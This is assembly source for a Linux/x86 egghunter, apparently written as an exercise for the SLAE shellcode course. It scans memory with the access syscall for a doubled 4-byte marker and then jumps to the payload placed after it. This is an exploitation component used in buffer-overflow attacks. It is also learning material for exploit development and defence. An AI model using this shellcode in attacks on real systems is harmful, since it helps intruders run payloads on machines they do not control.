;Linux/x86 egghunter
;by Anton Ostrokonskiy @ostrokonskiy
;SLAE-924

global _start

section .text
_start:
mov ebx,0x50905090
xor ecx, ecx
mul ecx

next_page:
    or dx, 0xfff

searching_egg:
    inc edx

pusha

lea ebx, [edx + 4]
mov al, 0x21
int 0x80

cmp al,0xf2
popa
jz next_page
cmp [edx], ebx
jnz searching_egg
cmp [edx+0x4],ebx
jnz searching_egg
jmp edx
